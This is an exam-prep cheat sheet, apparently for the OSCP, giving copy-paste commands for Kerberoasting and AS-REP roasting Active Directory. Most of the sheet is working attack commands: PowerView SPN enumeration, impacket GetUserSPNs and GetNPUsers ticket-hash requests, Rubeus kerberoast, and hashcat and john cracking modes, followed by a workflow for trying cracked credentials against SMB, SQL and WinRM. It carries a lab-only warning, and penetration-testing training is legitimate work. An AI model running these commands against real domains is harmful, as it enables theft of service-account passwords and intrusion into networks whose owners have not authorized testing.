# Kerberoast Cheat Sheet — Rubeus & GetUserSPNs (LAB ONLY)

**LAB ONLY — do not run against systems you do not own or are not authorized to test.**

---

## TL;DR (1-line)

Enumerate SPNs → request TGS for SPN accounts → export ticket blobs → crack offline (hashcat/john) → validate cracked creds.

---

## Quick tool map & when to use

- **impacket GetUserSPNs.py** (Kali/Linux)
    
    - Use from an attacker box when you have a domain user account and want to bulk-request TGS for all SPNs and save hashcat-ready blobs.
        
- **Rubeus.exe** (Windows host)
    
    - Use when you have an interactive Windows shell (e.g., a user shell on a host). Great for on-host Kerberos ops and direct hash export in hashcat format.
        
- **GetNPUsers.py** (Impacket) — AS-REP roast
    
    - Use when checking for accounts with `DONT_REQUIRE_PREAUTH` (AS-REP roastable). Needs no password for discovery.
        
- **PowerView / PowerShell**
    
    - Use for AD enumeration to list SPNs and prioritize targets (run on a Windows session or via PowerShell Remoting).
        
- **hashcat / John**
    
    - Offline cracking engines. Use hashcat for GPU accelerated cracking (modes below), John for CPU.
        
- **BloodHound / SharpHound**
    
    - Use for AD mapping to prioritize service accounts and attack paths.
        

---

## Copy-paste lab commands (concise)

### 1) Enumerate SPNs with PowerView (on Windows)

```powershell
# PowerShell (PowerView).
Get-DomainUser -Properties servicePrincipalName | Where-Object { $_.servicePrincipalName } |
  Select-Object sAMAccountName, servicePrincipalName
```

### 2) GetUserSPNs (Impacket) — request TGS and save hashes

```bash
# From Kali (replace DOMAIN/user:pass and DC IP)
impacket-GetUserSPNs DOMAIN/user:Password -dc-ip <DC_IP> -request > spn_hashes.txt
# or with explicit output file
impacket-GetUserSPNs DOMAIN/user:Password -dc-ip <DC_IP> -request -outputfile spn_hashes.txt
```

**When to use:** use this as your primary network-based collection tool when you can authenticate from Kali.

### 3) Rubeus kerberoast (on a Windows host)

```powershell
# Run from a Windows shell where you have a user token
Rubeus.exe kerberoast /nowrap /format:hashcat > rubeus_hashes.txt
```

**When to use:** use Rubeus when operating on Windows (remote shell/webshell that can execute Rubeus). It outputs hashcat-ready strings.

### 4) GetNPUsers (AS-REP roast discovery)

```bash
# Impacket (no password required for discovery)
impacket-GetNPUsers -no-pass DOMAIN/ -dc-ip <DC_IP> -usersfile users.txt > asrep_hashes.txt
```

**When to use:** run this alongside Kerberoast to find AS-REP targets (different precondition: DONT_REQUIRE_PREAUTH).

### 5) Crack with hashcat (common modes)

```bash
# Kerberos TGS RC4 (etype 23) — common, mode 13100
hashcat -m 13100 spn_hashes.txt /path/to/wordlist -O -o cracked.txt

# AS-REP (etype 23) — mode 18200
hashcat -m 18200 asrep_hashes.txt /path/to/wordlist -O -o cracked_asrep.txt
```

**When to use:** after you collect ticket blobs; run offline. Check header to confirm encryption type; adjust mode if AES (see hashcat docs).

### 6) John the Ripper alternative

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs spn_hashes.txt
john --show spn_hashes.txt
```

---

## Parsing tips & gotchas

- **Check the ticket header**: strings like `$krb5tgs$` indicate krb5tgs format; the enctype (RC4 vs AES) determines hashcat mode. Default common is RC4 (13100). If tickets are AES, use the corresponding mode.
    
- **Output formats**: `GetUserSPNs.py` and `Rubeus` produce hashcat-ready strings; ensure you pipe/save them intact and don’t modify encoding.
    
- **No SPNs found**: verify LDAP/PowerView enumeration — SPNs are stored in `servicePrincipalName` attribute.
    
- **No creds / auth fails**: GetUserSPNs requires a valid domain user. If you lack creds, prioritize gaining a domain user or use other recon (AS-REP requires only username list and no preauth users).
    

---

## Short workflow (memorize)

1. Enumerate SPNs (PowerView / ldapsearch)
    
2. Use `GetUserSPNs.py` (Kali) or `Rubeus kerberoast` (on-host) to request TGS and export hashes
    
3. Crack offline with hashcat/john (use correct mode)
    
4. Test cracked creds against services (SMB/SQL/WinRM) in lab
    

---

## Quick reference: when to use each tool

- **GetUserSPNs (Impacket)** — primary network collector from Kali when you have domain creds
    
- **Rubeus** — on-host Windows Kerberos operations (use when you have a shell on a Windows box)
    
- **GetNPUsers** — AS-REP discovery (no password required for some operations)
    
- **hashcat / john** — offline cracking
    
- **PowerView / BloodHound** — enumeration & prioritization
    

---

Keep this sheet on your exam clipboard. Good luck on the OSCP — go crush it.